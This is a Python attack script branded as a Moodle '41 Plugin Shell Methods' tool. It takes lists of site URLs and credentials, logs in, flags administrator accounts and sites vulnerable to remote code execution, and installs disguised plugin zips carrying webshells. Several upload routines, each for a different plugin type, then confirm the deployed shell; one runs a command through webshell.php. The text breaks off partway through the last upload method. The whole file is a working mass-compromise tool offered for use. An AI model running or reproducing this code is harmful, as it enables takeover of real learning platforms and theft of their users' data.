import requests
import os
import sys
import re
from colorama import Fore, init
from cfonts import say
from multiprocessing.dummy import Pool as ThreadPool

init(autoreset=True)
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def Banner():
    os.system("cls" if os.name == "nt" else "clear")
    say("X - Moodle", colors=["red", "green"], align="center")
    say("..:: 41 Plugin Shell Methods ::..", space=False, font="console", colors=["red"], background="black", align="center")
    say("..:: Created by NumeXx ::..", space=False, font="console", colors=["red"], background="black", align="center")
    print("")

def Logs(args):
    sys.stdout.write(f"\n{args}")

class MoodleChecker:
    def __init__(self, lista):
        self.session = requests.Session()
        self.lista = lista
        self.url = lista.split("|")[0]
        self.username = lista.split("|")[1]
        self.password = lista.split("|")[2]
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36"
        }
        self.timeout = 15
    
    def setLoginToken(self):
        try:
            req = self.session.get(self.url, headers=self.headers, verify=False, timeout=self.timeout).text
            return re.findall(r'"logintoken" value="(.*?)"', req)[0]
        except:
            return ""
    
    def isAdmin(self):
        try:
            req = self.session.get(self.url.replace("/login/index.php", "/my"), headers=self.headers, verify=False, timeout=self.timeout).text
            if "admin/search.php" in req:
                return True
            else:
                return False
        except:
            return False
    
    def isVulnRCE(self):
        try:
            req = self.session.get(self.url.replace("/login/index.php", "/admin/settings.php?section=systempaths"), headers=self.headers, verify=False, timeout=self.timeout).text
            if 'name="s__aspellpath"' in req:
                return True
            else:
                return False
        except:
            return False
    
    def isHasPlugin(self):
        try:
            req = self.session.get(self.url.replace("/login/index.php", "/admin/tool/installaddon/index.php"), headers=self.headers, verify=False, timeout=self.timeout).text
            if 'name="zipfilechoose"' in req:
                return True
            else:
                return False
        except:
            return False
    
    def CheckShell(self, url, keywords):
        try:
            req = requests.get(url, headers={
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
            }, timeout=self.timeout, verify=False).text
            
            if keywords in req:
                return True
            else:
                return False
        except:
            return False
    
    def isLogin(self):
        try:
            data = {
                "anchor": "",
                "logintoken": self.setLoginToken(),
                "username": self.username,
                "password": self.password,
            }
            
            req = self.session.post(self.url, data=data, verify=False, headers=self.headers, timeout=self.timeout, allow_redirects=False)
            
            if req.status_code == 303 and "MOODLEID1_=deleted" in req.headers["Set-Cookie"]:
                if self.isVulnRCE():
                    open("VULN-RCE.txt", "a").write(self.lista + "\n")
                
                return True
            else:
                return False
        except:
            return False
    
    def UploadShellBlock(self):
        try:
            req = self.session.get(self.url.replace("/login/index.php", "/admin/tool/installaddon/index.php"), headers=self.headers, verify=False, timeout=self.timeout).text
            client_id = re.findall(r'"client_id":"(.*?)"', req)[0]
            itemId = re.findall(r'"itemid":(.*?),', req)[0]
            maxbytes = re.findall(r'"maxbytes":(.*?),', req)[0]
            ctx_id = re.findall(r'ctx_id=(.*?)&', req)[0]
            sesKey = re.findall(r'"sesskey":"(.*?)"', req)[0]
            repo_id = re.findall(r'"recentrepository":"(.*?)"', req)[0]
            author = re.findall(r'"author":"(.*?)"', req)[0]
            licenses = re.findall(r'"defaultlicense":"(.*?)"', req)[0]
            submitButton = re.findall(r'id="id_submitbutton"\s*value="(.*?)"', req, re.DOTALL)[0]
            files = {'repo_upload_file': open("block_selectrss_moodle34_2017092500.zip", "rb")}
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=list", data={
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": maxbytes,
                "areamaxbytes": "-1",
                "ctx_id": ctx_id
            }, headers=self.headers, verify=False, timeout=self.timeout)
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=upload", data={
                "title": "",
                "author": author,
                "license": licenses,
                "itemid": itemId,
                "accepted_types[]": ".zip",
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": "-1",
                "areamaxbytes": "-1",
                "ctx_id": ctx_id,
                "savepath": "/"
            }, files=files, headers=self.headers, verify=False, timeout=self.timeout)
            zipfileid = req.json()["id"]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                'sesskey': sesKey,
                '_qf__tool_installaddon_installfromzip_form': '1',
                'mform_showmore_id_general': '0',
                'mform_isexpanded_id_general': '1',
                'zipfile': f'{zipfileid}',
                'plugintype': '',
                'rootdir': '',
                'submitbutton': submitButton,
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)

            req = self.session.get(req.headers["Location"], headers=self.headers, verify=False, timeout=self.timeout).text
            zipcomponent = re.findall(r'name="installzipcomponent" value="(.*?)"', req)[0]
            installzipstorage = re.findall(r'name="installzipstorage" value="(.*?)"', req)[0]
            sesKey = re.findall(r'name="sesskey" value="(.*?)"', req)[0]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                "installzipcomponent": zipcomponent,
                "installzipstorage": installzipstorage,
                "installzipconfirm": "1",
                "sesskey": sesKey
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)
            
            if self.CheckShell(self.url.replace("/login/index.php", "") + "/blocks/selectrss/lock.php", 'type="password" name="password"'):
                return True
            else:
                return False
        except:
            return False
    
    def UploadShellLang(self):
        try:
            req = self.session.get(self.url.replace("/login/index.php", "/admin/tool/installaddon/index.php"), headers=self.headers, verify=False, timeout=self.timeout).text
            client_id = re.findall(r'"client_id":"(.*?)"', req)[0]
            itemId = re.findall(r'"itemid":(.*?),', req)[0]
            maxbytes = re.findall(r'"maxbytes":(.*?),', req)[0]
            ctx_id = re.findall(r'ctx_id=(.*?)&', req)[0]
            sesKey = re.findall(r'"sesskey":"(.*?)"', req)[0]
            repo_id = re.findall(r'"recentrepository":"(.*?)"', req)[0]
            author = re.findall(r'"author":"(.*?)"', req)[0]
            licenses = re.findall(r'"defaultlicense":"(.*?)"', req)[0]
            submitButton = re.findall(r'id="id_submitbutton"\s*value="(.*?)"', req, re.DOTALL)[0]
            files = {'repo_upload_file': open("lanciau.zip", "rb")}
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=list", data={
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": maxbytes,
                "areamaxbytes": "-1",
                "ctx_id": ctx_id
            }, headers=self.headers, verify=False, timeout=self.timeout)
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=upload", data={
                "title": "",
                "author": author,
                "license": licenses,
                "itemid": itemId,
                "accepted_types[]": ".zip",
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": "-1",
                "areamaxbytes": "-1",
                "ctx_id": ctx_id,
                "savepath": "/"
            }, files=files, headers=self.headers, verify=False, timeout=self.timeout)
            zipfileid = req.json()["id"]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                'sesskey': sesKey,
                '_qf__tool_installaddon_installfromzip_form': '1',
                'mform_showmore_id_general': '0',
                'mform_isexpanded_id_general': '1',
                'zipfile': f'{zipfileid}',
                'plugintype': '',
                'rootdir': '',
                'submitbutton': submitButton,
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)

            req = self.session.get(req.headers["Location"], headers=self.headers, verify=False, timeout=self.timeout).text
            zipcomponent = re.findall(r'name="installzipcomponent" value="(.*?)"', req)[0]
            installzipstorage = re.findall(r'name="installzipstorage" value="(.*?)"', req)[0]
            sesKey = re.findall(r'name="sesskey" value="(.*?)"', req)[0]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                "installzipcomponent": zipcomponent,
                "installzipstorage": installzipstorage,
                "installzipconfirm": "1",
                "sesskey": sesKey
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)
            
            if self.CheckShell(self.url.replace("/login/index.php", "") + "/theme/lanciau/lang/en/theme_lanciau.php", 'type="password" name="password"'):
                return True
            else:
                return False
        except:
            return False
    
    def UploadShellMod(self):
        try:
            req = self.session.get(self.url.replace("/login/index.php", "/admin/tool/installaddon/index.php"), headers=self.headers, verify=False, timeout=self.timeout).text
            client_id = re.findall(r'"client_id":"(.*?)"', req)[0]
            itemId = re.findall(r'"itemid":(.*?),', req)[0]
            maxbytes = re.findall(r'"maxbytes":(.*?),', req)[0]
            ctx_id = re.findall(r'ctx_id=(.*?)&', req)[0]
            sesKey = re.findall(r'"sesskey":"(.*?)"', req)[0]
            repo_id = re.findall(r'"recentrepository":"(.*?)"', req)[0]
            author = re.findall(r'"author":"(.*?)"', req)[0]
            licenses = re.findall(r'"defaultlicense":"(.*?)"', req)[0]
            submitButton = re.findall(r'id="id_submitbutton"\s*value="(.*?)"', req, re.DOTALL)[0]
            files = {'repo_upload_file': open("mod_lanciau.zip", "rb")}
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=list", data={
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": maxbytes,
                "areamaxbytes": "-1",
                "ctx_id": ctx_id
            }, headers=self.headers, verify=False, timeout=self.timeout)
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=upload", data={
                "title": "",
                "author": author,
                "license": licenses,
                "itemid": itemId,
                "accepted_types[]": ".zip",
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": "-1",
                "areamaxbytes": "-1",
                "ctx_id": ctx_id,
                "savepath": "/"
            }, files=files, headers=self.headers, verify=False, timeout=self.timeout)
            zipfileid = req.json()["id"]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                'sesskey': sesKey,
                '_qf__tool_installaddon_installfromzip_form': '1',
                'mform_showmore_id_general': '0',
                'mform_isexpanded_id_general': '1',
                'zipfile': f'{zipfileid}',
                'plugintype': '',
                'rootdir': '',
                'submitbutton': submitButton,
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)

            req = self.session.get(req.headers["Location"], headers=self.headers, verify=False, timeout=self.timeout).text
            zipcomponent = re.findall(r'name="installzipcomponent" value="(.*?)"', req)[0]
            installzipstorage = re.findall(r'name="installzipstorage" value="(.*?)"', req)[0]
            sesKey = re.findall(r'name="sesskey" value="(.*?)"', req)[0]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                "installzipcomponent": zipcomponent,
                "installzipstorage": installzipstorage,
                "installzipconfirm": "1",
                "sesskey": sesKey
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)
            
            if self.CheckShell(self.url.replace("/login/index.php", "") + "/mod/lanciau/lang/en/lanciau.php", 'type="password" name="password"'):
                return True
            else:
                return False
        except:
            return False
    
    def UploadShellLocal(self):
        try:
            req = self.session.get(self.url.replace("/login/index.php", "/admin/tool/installaddon/index.php"), headers=self.headers, verify=False, timeout=self.timeout).text
            client_id = re.findall(r'"client_id":"(.*?)"', req)[0]
            itemId = re.findall(r'"itemid":(.*?),', req)[0]
            maxbytes = re.findall(r'"maxbytes":(.*?),', req)[0]
            ctx_id = re.findall(r'ctx_id=(.*?)&', req)[0]
            sesKey = re.findall(r'"sesskey":"(.*?)"', req)[0]
            repo_id = re.findall(r'"recentrepository":"(.*?)"', req)[0]
            author = re.findall(r'"author":"(.*?)"', req)[0]
            licenses = re.findall(r'"defaultlicense":"(.*?)"', req)[0]
            submitButton = re.findall(r'id="id_submitbutton"\s*value="(.*?)"', req, re.DOTALL)[0]
            files = {'repo_upload_file': open("moodle-webshell-plugin-1.1.0.zip", "rb")}
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=list", data={
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": maxbytes,
                "areamaxbytes": "-1",
                "ctx_id": ctx_id
            }, headers=self.headers, verify=False, timeout=self.timeout)
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=upload", data={
                "title": "",
                "author": author,
                "license": licenses,
                "itemid": itemId,
                "accepted_types[]": ".zip",
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": "-1",
                "areamaxbytes": "-1",
                "ctx_id": ctx_id,
                "savepath": "/"
            }, files=files, headers=self.headers, verify=False, timeout=self.timeout)
            zipfileid = req.json()["id"]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                'sesskey': sesKey,
                '_qf__tool_installaddon_installfromzip_form': '1',
                'mform_showmore_id_general': '0',
                'mform_isexpanded_id_general': '1',
                'zipfile': f'{zipfileid}',
                'plugintype': '',
                'rootdir': '',
                'submitbutton': submitButton,
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)

            req = self.session.get(req.headers["Location"], headers=self.headers, verify=False, timeout=self.timeout).text
            zipcomponent = re.findall(r'name="installzipcomponent" value="(.*?)"', req)[0]
            installzipstorage = re.findall(r'name="installzipstorage" value="(.*?)"', req)[0]
            sesKey = re.findall(r'name="sesskey" value="(.*?)"', req)[0]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                "installzipcomponent": zipcomponent,
                "installzipstorage": installzipstorage,
                "installzipconfirm": "1",
                "sesskey": sesKey
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)
            
            if self.CheckShell(self.url.replace("/login/index.php", "") + "/local/moodle_webshell/webshell.php?action=exec&cmd=php%20-v", 'The PHP Group'):
                return True
            else:
                return False
        except:
            return False
    
    def UploadShellAdminTool(self):
        try:
            req = self.session.get(self.url.replace("/login/index.php", "/admin/tool/installaddon/index.php"), headers=self.headers, verify=False, timeout=self.timeout).text
            client_id = re.findall(r'"client_id":"(.*?)"', req)[0]
            itemId = re.findall(r'"itemid":(.*?),', req)[0]
            maxbytes = re.findall(r'"maxbytes":(.*?),', req)[0]
            ctx_id = re.findall(r'ctx_id=(.*?)&', req)[0]
            sesKey = re.findall(r'"sesskey":"(.*?)"', req)[0]
            repo_id = re.findall(r'"recentrepository":"(.*?)"', req)[0]
            author = re.findall(r'"author":"(.*?)"', req)[0]
            licenses = re.findall(r'"defaultlicense":"(.*?)"', req)[0]
            submitButton = re.findall(r'id="id_submitbutton"\s*value="(.*?)"', req, re.DOTALL)[0]
            files = {'repo_upload_file': open("moodle-tool_redirects-master.zip", "rb")}
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=list", data={
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": maxbytes,
                "areamaxbytes": "-1",
                "ctx_id": ctx_id
            }, headers=self.headers, verify=False, timeout=self.timeout)
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=upload", data={
                "title": "",
                "author": author,
                "license": licenses,
                "itemid": itemId,
                "accepted_types[]": ".zip",
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": "-1",
                "areamaxbytes": "-1",
                "ctx_id": ctx_id,
                "savepath": "/"
            }, files=files, headers=self.headers, verify=False, timeout=self.timeout)
            zipfileid = req.json()["id"]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                'sesskey': sesKey,
                '_qf__tool_installaddon_installfromzip_form': '1',
                'mform_showmore_id_general': '0',
                'mform_isexpanded_id_general': '1',
                'zipfile': f'{zipfileid}',
                'plugintype': '',
                'rootdir': '',
                'submitbutton': submitButton,
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)

            req = self.session.get(req.headers["Location"], headers=self.headers, verify=False, timeout=self.timeout).text
            zipcomponent = re.findall(r'name="installzipcomponent" value="(.*?)"', req)[0]
            installzipstorage = re.findall(r'name="installzipstorage" value="(.*?)"', req)[0]
            sesKey = re.findall(r'name="sesskey" value="(.*?)"', req)[0]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                "installzipcomponent": zipcomponent,
                "installzipstorage": installzipstorage,
                "installzipconfirm": "1",
                "sesskey": sesKey
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)
            
            if self.CheckShell(self.url.replace("/login/index.php", "") + "/admin/tool/redirects/lock.php", 'type="password" name="password"'):
                return True
            else:
                return False
        except:
            return False
    
    def UploadShellPaymentGateway(self):
        try:
            req = self.session.get(self.url.replace("/login/index.php", "/admin/tool/installaddon/index.php"), headers=self.headers, verify=False, timeout=self.timeout).text
            client_id = re.findall(r'"client_id":"(.*?)"', req)[0]
            itemId = re.findall(r'"itemid":(.*?),', req)[0]
            maxbytes = re.findall(r'"maxbytes":(.*?),', req)[0]
            ctx_id = re.findall(r'ctx_id=(.*?)&', req)[0]
            sesKey = re.findall(r'"sesskey":"(.*?)"', req)[0]
            repo_id = re.findall(r'"recentrepository":"(.*?)"', req)[0]
            author = re.findall(r'"author":"(.*?)"', req)[0]
            licenses = re.findall(r'"defaultlicense":"(.*?)"', req)[0]
            submitButton = re.findall(r'id="id_submitbutton"\s*value="(.*?)"', req, re.DOTALL)[0]
            files = {'repo_upload_file': open("moodle-paygw_duitku-main.zip", "rb")}
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=list", data={
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": maxbytes,
                "areamaxbytes": "-1",
                "ctx_id": ctx_id
            }, headers=self.headers, verify=False, timeout=self.timeout)
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=upload", data={
                "title": "",
                "author": author,
                "license": licenses,
                "itemid": itemId,
                "accepted_types[]": ".zip",
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": "-1",
                "areamaxbytes": "-1",
                "ctx_id": ctx_id,
                "savepath": "/"
            }, files=files, headers=self.headers, verify=False, timeout=self.timeout)
            zipfileid = req.json()["id"]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                'sesskey': sesKey,
                '_qf__tool_installaddon_installfromzip_form': '1',
                'mform_showmore_id_general': '0',
                'mform_isexpanded_id_general': '1',
                'zipfile': f'{zipfileid}',
                'plugintype': '',
                'rootdir': '',
                'submitbutton': submitButton,
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)

            req = self.session.get(req.headers["Location"], headers=self.headers, verify=False, timeout=self.timeout).text
            zipcomponent = re.findall(r'name="installzipcomponent" value="(.*?)"', req)[0]
            installzipstorage = re.findall(r'name="installzipstorage" value="(.*?)"', req)[0]
            sesKey = re.findall(r'name="sesskey" value="(.*?)"', req)[0]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                "installzipcomponent": zipcomponent,
                "installzipstorage": installzipstorage,
                "installzipconfirm": "1",
                "sesskey": sesKey
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)
            
            if self.CheckShell(self.url.replace("/login/index.php", "") + "/payment/gateway/duitku/lock.php", 'type="password" name="password"'):
                return True
            else:
                return False
        except:
            return False
    
    def UploadShellH5P(self):
        try:
            req = self.session.get(self.url.replace("/login/index.php", "/admin/tool/installaddon/index.php"), headers=self.headers, verify=False, timeout=self.timeout).text
            client_id = re.findall(r'"client_id":"(.*?)"', req)[0]
            itemId = re.findall(r'"itemid":(.*?),', req)[0]
            maxbytes = re.findall(r'"maxbytes":(.*?),', req)[0]
            ctx_id = re.findall(r'ctx_id=(.*?)&', req)[0]
            sesKey = re.findall(r'"sesskey":"(.*?)"', req)[0]
            repo_id = re.findall(r'"recentrepository":"(.*?)"', req)[0]
            author = re.findall(r'"author":"(.*?)"', req)[0]
            licenses = re.findall(r'"defaultlicense":"(.*?)"', req)[0]
            submitButton = re.findall(r'id="id_submitbutton"\s*value="(.*?)"', req, re.DOTALL)[0]
            files = {'repo_upload_file': open("moodle-h5plib_v126-main.zip", "rb")}
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=list", data={
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": maxbytes,
                "areamaxbytes": "-1",
                "ctx_id": ctx_id
            }, headers=self.headers, verify=False, timeout=self.timeout)
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=upload", data={
                "title": "",
                "author": author,
                "license": licenses,
                "itemid": itemId,
                "accepted_types[]": ".zip",
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": "-1",
                "areamaxbytes": "-1",
                "ctx_id": ctx_id,
                "savepath": "/"
            }, files=files, headers=self.headers, verify=False, timeout=self.timeout)
            zipfileid = req.json()["id"]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                'sesskey': sesKey,
                '_qf__tool_installaddon_installfromzip_form': '1',
                'mform_showmore_id_general': '0',
                'mform_isexpanded_id_general': '1',
                'zipfile': f'{zipfileid}',
                'plugintype': '',
                'rootdir': '',
                'submitbutton': submitButton,
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)

            req = self.session.get(req.headers["Location"], headers=self.headers, verify=False, timeout=self.timeout).text
            zipcomponent = re.findall(r'name="installzipcomponent" value="(.*?)"', req)[0]
            installzipstorage = re.findall(r'name="installzipstorage" value="(.*?)"', req)[0]
            sesKey = re.findall(r'name="sesskey" value="(.*?)"', req)[0]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                "installzipcomponent": zipcomponent,
                "installzipstorage": installzipstorage,
                "installzipconfirm": "1",
                "sesskey": sesKey
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)
            
            if self.CheckShell(self.url.replace("/login/index.php", "") + "/h5p/h5plib/v126/lock.php", 'type="password" name="password"'):
                return True
            else:
                return False
        except:
            return False
    
    def UploadShellContentbank(self):
        try:
            req = self.session.get(self.url.replace("/login/index.php", "/admin/tool/installaddon/index.php"), headers=self.headers, verify=False, timeout=self.timeout).text
            client_id = re.findall(r'"client_id":"(.*?)"', req)[0]
            itemId = re.findall(r'"itemid":(.*?),', req)[0]
            maxbytes = re.findall(r'"maxbytes":(.*?),', req)[0]
            ctx_id = re.findall(r'ctx_id=(.*?)&', req)[0]
            sesKey = re.findall(r'"sesskey":"(.*?)"', req)[0]
            repo_id = re.findall(r'"recentrepository":"(.*?)"', req)[0]
            author = re.findall(r'"author":"(.*?)"', req)[0]
            licenses = re.findall(r'"defaultlicense":"(.*?)"', req)[0]
            submitButton = re.findall(r'id="id_submitbutton"\s*value="(.*?)"', req, re.DOTALL)[0]
            files = {'repo_upload_file': open("moodle-contenttype_repurpose-1.3.1.zip", "rb")}
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=list", data={
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": maxbytes,
                "areamaxbytes": "-1",
                "ctx_id": ctx_id
            }, headers=self.headers, verify=False, timeout=self.timeout)
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=upload", data={
                "title": "",
                "author": author,
                "license": licenses,
                "itemid": itemId,
                "accepted_types[]": ".zip",
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": "-1",
                "areamaxbytes": "-1",
                "ctx_id": ctx_id,
                "savepath": "/"
            }, files=files, headers=self.headers, verify=False, timeout=self.timeout)
            zipfileid = req.json()["id"]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                'sesskey': sesKey,
                '_qf__tool_installaddon_installfromzip_form': '1',
                'mform_showmore_id_general': '0',
                'mform_isexpanded_id_general': '1',
                'zipfile': f'{zipfileid}',
                'plugintype': '',
                'rootdir': '',
                'submitbutton': submitButton,
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)

            req = self.session.get(req.headers["Location"], headers=self.headers, verify=False, timeout=self.timeout).text
            zipcomponent = re.findall(r'name="installzipcomponent" value="(.*?)"', req)[0]
            installzipstorage = re.findall(r'name="installzipstorage" value="(.*?)"', req)[0]
            sesKey = re.findall(r'name="sesskey" value="(.*?)"', req)[0]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                "installzipcomponent": zipcomponent,
                "installzipstorage": installzipstorage,
                "installzipconfirm": "1",
                "sesskey": sesKey
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)
            
            if self.CheckShell(self.url.replace("/login/index.php", "") + "/contentbank/contenttype/repurpose/lock.php", 'type="password" name="password"'):
                return True
            else:
                return False
        except:
            return False
    
    def UploadShellFileConverter(self):
        try:
            req = self.session.get(self.url.replace("/login/index.php", "/admin/tool/installaddon/index.php"), headers=self.headers, verify=False, timeout=self.timeout).text
            client_id = re.findall(r'"client_id":"(.*?)"', req)[0]
            itemId = re.findall(r'"itemid":(.*?),', req)[0]
            maxbytes = re.findall(r'"maxbytes":(.*?),', req)[0]
            ctx_id = re.findall(r'ctx_id=(.*?)&', req)[0]
            sesKey = re.findall(r'"sesskey":"(.*?)"', req)[0]
            repo_id = re.findall(r'"recentrepository":"(.*?)"', req)[0]
            author = re.findall(r'"author":"(.*?)"', req)[0]
            licenses = re.findall(r'"defaultlicense":"(.*?)"', req)[0]
            submitButton = re.findall(r'id="id_submitbutton"\s*value="(.*?)"', req, re.DOTALL)[0]
            files = {'repo_upload_file': open("moodle-fileconverter_onlyoffice-master.zip", "rb")}
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=list", data={
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": maxbytes,
                "areamaxbytes": "-1",
                "ctx_id": ctx_id
            }, headers=self.headers, verify=False, timeout=self.timeout)
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=upload", data={
                "title": "",
                "author": author,
                "license": licenses,
                "itemid": itemId,
                "accepted_types[]": ".zip",
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": "-1",
                "areamaxbytes": "-1",
                "ctx_id": ctx_id,
                "savepath": "/"
            }, files=files, headers=self.headers, verify=False, timeout=self.timeout)
            zipfileid = req.json()["id"]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                'sesskey': sesKey,
                '_qf__tool_installaddon_installfromzip_form': '1',
                'mform_showmore_id_general': '0',
                'mform_isexpanded_id_general': '1',
                'zipfile': f'{zipfileid}',
                'plugintype': '',
                'rootdir': '',
                'submitbutton': submitButton,
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)

            req = self.session.get(req.headers["Location"], headers=self.headers, verify=False, timeout=self.timeout).text
            zipcomponent = re.findall(r'name="installzipcomponent" value="(.*?)"', req)[0]
            installzipstorage = re.findall(r'name="installzipstorage" value="(.*?)"', req)[0]
            sesKey = re.findall(r'name="sesskey" value="(.*?)"', req)[0]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                "installzipcomponent": zipcomponent,
                "installzipstorage": installzipstorage,
                "installzipconfirm": "1",
                "sesskey": sesKey
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)
            
